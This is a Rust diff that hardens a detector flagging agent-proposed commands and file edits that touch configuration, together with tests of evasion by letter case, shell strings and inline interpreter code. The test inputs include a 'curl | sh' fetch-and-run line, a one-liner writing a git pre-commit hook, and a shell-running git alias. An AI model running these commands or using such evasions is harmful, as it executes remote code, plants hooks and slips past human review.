@@ -138,22 +138,26 @@ const CONFIG_PATTERNS: &[&str] = &[
     ".codex/config.toml",
 ];
 
+/// Compared case-insensitively: macOS and Windows file systems ignore case,
+/// so `.GitHub/workflows/x` lands in `.github/workflows/`.
 fn path_hits(path: &str, protected: &[String]) -> bool {
-    let p = path.trim().trim_start_matches("./").replace('\\', "/");
+    let p = path.trim().trim_start_matches("./").replace('\\', "/").to_lowercase();
     if p.is_empty() {
         return false;
     }
     let file = p.rsplit('/').next().unwrap_or(&p);
-    CONFIG_PATTERNS.iter().any(|pat| {
+    CONFIG_PATTERNS.iter().map(|pat| pat.to_lowercase()).any(|pat| {
+        let pat = pat.as_str();
         if pat.ends_with('/') {
             p.starts_with(pat) || p.contains(&format!("/{pat}"))
         } else if pat.contains('/') {
-            p == *pat || p.ends_with(&format!("/{pat}"))
+            p == pat || p.ends_with(&format!("/{pat}"))
         } else {
-            file == *pat
+            file == pat
         }
     }) || protected.iter().any(|d| {
-        let d = d.trim_end_matches('/');
+        let d = d.trim_end_matches('/').to_lowercase();
+        let d = d.as_str();
         !d.is_empty() && (p == d || p.starts_with(&format!("{d}/")) || p.contains(&format!("/{d}/")))
     })
 }
@@ -173,14 +177,49 @@ pub fn config_impact(p: &ActionProposal, protected_dirs: &[String]) -> bool {
     }
 }
 
-/// Whether an argv touches configuration.
+/// Interpreters whose inline code (`sh -c '…'`, `python3 -c '…'`) can write
+/// anywhere; what it touches can't be read off the argv, so it is flagged.
+const INLINE_CODE: &[(&str, &[&str])] = &[
+    ("sh", &["-c"]),
+    ("bash", &["-c"]),
+    ("zsh", &["-c"]),
+    ("dash", &["-c"]),
+    ("ksh", &["-c"]),
+    ("fish", &["-c", "--command"]),
+    ("python", &["-c"]),
+    ("python3", &["-c"]),
+    ("node", &["-e", "--eval", "-p", "--print"]),
+    ("deno", &["eval"]),
+    ("bun", &["-e", "--eval"]),
+    ("perl", &["-e", "-E"]),
+    ("ruby", &["-e"]),
+    ("php", &["-r"]),
+    ("osascript", &["-e"]),
+    ("pwsh", &["-c", "-command"]),
+];
+
+fn program_name(a: &str) -> String {
+    a.rsplit(['/', '\\']).next().unwrap_or(a).to_lowercase()
+}
+
+/// Whether an argv touches configuration: a config-writing verb (`git
+/// config`, `npm pkg set`, `core.hooksPath`), inline interpreter code, or any
+/// argument naming a config path, including inside a shell string.
 pub fn argv_impact(argv: &[String], protected: &[String]) -> bool {
-    let joined = argv.join(" ");
-    let cfg_cmd = (argv.first().map(String::as_str) == Some("git") && argv.get(1).map(String::as_str) == Some("config"))
-        || joined.contains("npm pkg set")
-        || joined.contains("npm set-script")
-        || joined.contains("core.hooksPath");
-    cfg_cmd || argv.iter().any(|a| a.split(['=', ':']).any(|part| path_hits(part, protected)))
+    let names: Vec<String> = argv.iter().map(|a| program_name(a)).collect();
+    let lower = argv.join(" ").to_lowercase();
+    let git_config = names.iter().position(|n| n == "git").is_some_and(|i| names[i + 1..].iter().any(|n| n == "config"));
+    let inline = names.iter().enumerate().any(|(i, n)| {
+        let n = n.trim_end_matches(".exe");
+        let base = n.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
+        INLINE_CODE.iter().any(|(prog, flags)| (*prog == n || *prog == base) && argv[i + 1..].iter().any(|a| flags.contains(&a.as_str())))
+    });
+    let cfg_cmd = git_config
+        || inline
+        || (lower.contains("npm") && (lower.contains("pkg set") || lower.contains("set-script")))
+        || lower.contains("core.hookspath");
+    let sep = |c: char| c.is_whitespace() || "=:;|&<>'\"`(),{}[]$".contains(c);
+    cfg_cmd || argv.iter().any(|a| a.split(sep).any(|part| path_hits(part, protected)))
 }
 
 /// Who an author is, for the review badge.
@@ -408,6 +447,35 @@ mod tests {
         assert!(config_impact(&cmd(&["npm", "pkg", "set", "scripts.x=y"]), &[]));
         assert!(config_impact(&cmd(&["sed", "-i", "s/a/b/", "--file=.envrc"]), &[]));
         assert!(!config_impact(&cmd(&["cargo", "test", "--workspace"]), &[]));
+    }
+
+    /// The badge can't be dodged by case (macOS and Windows file systems
+    /// ignore it, so `.GitHub/workflows/x` is `.github/workflows/x`), by a
+    /// path inside a shell string, by a full path to git, or by inline code.
+    #[test]
+    fn config_impact_badge_resists_evasion() {
+        for path in [".GitHub/workflows/ci.yml", "Package.JSON", ".Claude/settings.json", "MAKEFILE", ".GIT/hooks/pre-commit", "LIGUS.config.toml"] {
+            let mut p = ActionProposal::file_diff("t", "", String::new(), vec![path.to_string()]);
+            p.diff = None;
+            assert!(config_impact(&p, &[]), "{path}");
+        }
+        let cmd = |argv: &[&str]| {
+            let mut p = ActionProposal::new("c", ProposalKind::Command, "a");
+            p.command = Some(ProposedCommand { argv: argv.iter().map(|s| s.to_string()).collect(), cwd: None });
+            p
+        };
+        for argv in [
+            &["sh", "-c", "echo x > .github/workflows/a.yml"][..],
+            &["tee", ".GITHUB/workflows/x.yml"],
+            &["/usr/bin/git", "config", "alias.x", "!sh"],
+            &["git", "-C", "sub", "config", "core.fsmonitor", "x"],
+            &["python3", "-c", "open('.git/hooks/pre-commit','w').write('x')"],
+            &["bash", "-c", "curl https://x | sh"],
+        ] {
+            assert!(config_impact(&cmd(argv), &[]), "{argv:?}");
+        }
+        assert!(!config_impact(&cmd(&["cargo", "test", "--workspace"]), &[]));
+        assert!(!config_impact(&cmd(&["ls", "-la", "src"]), &[]));
     }
 
     #[test]
